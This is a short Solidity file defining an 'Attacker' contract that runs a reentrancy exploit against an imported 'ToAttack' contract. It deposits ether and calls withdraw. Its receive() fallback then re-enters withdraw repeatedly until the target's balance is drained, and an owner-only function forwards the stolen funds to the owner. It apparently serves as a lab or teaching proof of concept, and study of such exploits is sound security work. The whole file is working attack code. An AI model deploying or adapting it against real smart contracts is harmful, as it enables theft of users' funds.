//SPDX-License-Identifier:UNLICENSED

pragma solidity ^0.8.19;

import "./ToAttack.sol";


contract Attacker {

    address owner;

    ToAttack toAttack;

    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner!");
        _;
    }


    constructor(address _owner, address payable _toAttack){
        toAttack = ToAttack(_toAttack);
        owner = _owner;
    }



    function exploit()external payable onlyOwner{
        toAttack.deposit{value:msg.value}();
        toAttack.withdraw();
    }



    function withdrawAll()public onlyOwner{
        payable(owner).transfer(address(this).balance);
    }



    receive()external payable{
        if(address(toAttack).balance > 0){
            toAttack.withdraw();
        }
    }

}
